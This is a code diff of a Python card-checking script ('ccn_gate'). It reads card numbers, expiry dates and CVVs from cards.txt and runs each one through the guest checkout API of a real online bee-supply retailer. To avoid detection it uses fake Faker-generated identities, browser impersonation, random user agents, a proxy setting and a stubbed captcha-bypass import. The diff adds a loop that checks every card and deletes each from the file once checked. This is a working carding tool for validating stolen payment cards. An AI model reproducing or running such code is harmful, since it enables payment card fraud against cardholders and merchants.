@@ -1,54 +1,39 @@
-
+import random
 from faker import Faker
 from random import choice
-# from captcha_bypass import *
+#from captcha_bypass import *
 from curl_cffi import requests
 from colorama import init, Fore
 from fake_useragent import UserAgent
 
-# Supongo que ya tienes estas utilidades definidas en tu proyecto
-# from tu_modulo import usuario, capture
 
 def usuario() -> dict:
     number = random.randint(1111, 9999)
     postal = random.choice(['10080', '14925', '71601', '86556', '19980'])
-    return {
-        'name': Faker().name(),
-        'email': Faker().email().replace('@', '{}@'.format(number)),
-        'username': Faker().user_name(),
-        'phone': '512678{}'.format(number),
-        'city': Faker().city(),
-        'code': postal
-    }
+    return { 'name' : Faker().name(), 'email' : Faker().email().replace('@', '{}@'.format(number)), 'username' : Faker().user_name(), 'phone' : '512678{}'.format(number), 'city' : Faker().city(), 'code' : postal }
+
 
 def capture(data, start, end):
     try:
         star = data.index(start) + len(start)
         last = data.index(end, star)
         return data[star:last]
+
     except ValueError:
         return None
 
+
 def ccn_gate(card):
-    """
-    Envuelve la lógica de validación/checado de tarjetas.
-    Devuelve siempre un string en el formato CARD|STATUS|DETALLES
-    STATUS puede ser: APPROVED, DECLINED, ERROR, etc.
-    Nunca devuelve dict ni objetos no-string.
-    """
     max_retries = 10
     retry_count = 0
-
     while retry_count < max_retries:
         try:
             init(autoreset=True)
             #============[Funcions Need]============#
             cliente = requests.Session(impersonate=choice(["chrome124", "chrome123", "safari17_0", "safari17_2_ios", "safari15_3"]))
             cliente.proxies = {"https": ""}
-
             cc_number, mes, ano_number, cvv = card.split('|')
-            if len(ano_number) == 4:
-                ano_number = ano_number[2:4]
+            if len(ano_number) == 4: ano_number = ano_number[2:4]
             agente_user = UserAgent().random
 
             #============[Address Found]============#
@@ -81,7 +66,7 @@ def ccn_gate(card):
 
             #============[Requests 5]============#
             headers = {"User-Agent": agente_user,"Accept": "*/*","Content-Type": "application/json","X-Requested-With": "XMLHttpRequest","Origin": "https://glorybee.com","Referer": "https://glorybee.com/checkout/"}
-            data    = {"addressInformation":{"shipping_address":{"countryId":"US","regionId":"49","regionCode":"OR","region":"Oregon","street":[f"{number} B Airport Rd "],"company":"None","telephone":phone,"postcode":"97402","city":"eugene","firstname":name,"lastname":last,"middlename":"","extension_attributes":{"delivery_date":"","time_slot":"","location_id":"","location_address":""}},"billing_address":{"countryId":"US","regionId":"49","regionCode":"OR","region":"Oregon","street":[f"{number} B Airport Rd "],"company":"None","telephone":phone,"postcode":"97402","city":"eugene","firstname":name,"lastname":last," middlename":"","saveInAddressBook":None},"shipping_method_code":"GND","shipping_carrier_code":"shqups","extension_attributes":{}}}
+            data    = {"addressInformation":{"shipping_address":{"countryId":"US","regionId":"49","regionCode":"OR","region":"Oregon","street":[f"{number} B Airport Rd "],"company":"None","telephone":phone,"postcode":"97402","city":"eugene","firstname":name,"lastname":last,"middlename":"","extension_attributes":{"delivery_date":"","time_slot":"","location_id":"","location_address":""}},"billing_address":{"countryId":"US","regionId":"49","regionCode":"OR","region":"Oregon","street":[f"{number} B Airport Rd "],"company":"None","telephone":phone,"postcode":"97402","city":"eugene","firstname":name,"lastname":last,"middlename":"","saveInAddressBook":None},"shipping_method_code":"GND","shipping_carrier_code":"shqups","extension_attributes":{}}}
             result  = cliente.post(url=f"https://glorybee.com/rest/default/V1/guest-carts/{form_id}/shipping-information", json=data, headers=headers)
 
             #============[Requests 6]============#
@@ -116,3 +101,15 @@ def ccn_gate(card):
             retry_count += 1
     else:
         return {"card": card, "status": "ERROR", "resp":  f"Retries: {retry_count}"}
+
+
+if __name__ == "__main__":
+    file = open('cards.txt', 'r')
+    lines = file.readlines()
+    for position, x in enumerate(lines):
+        cc, mes, ano, cvv = x.split("|")
+        gateway = ccn_gate(f"{cc}|{mes}|{ano}|{cvv.strip()}")
+        print(gateway)
+        with open('cards.txt', "w")as f:
+            f.writelines(lines[position+1:])
+            f.close()
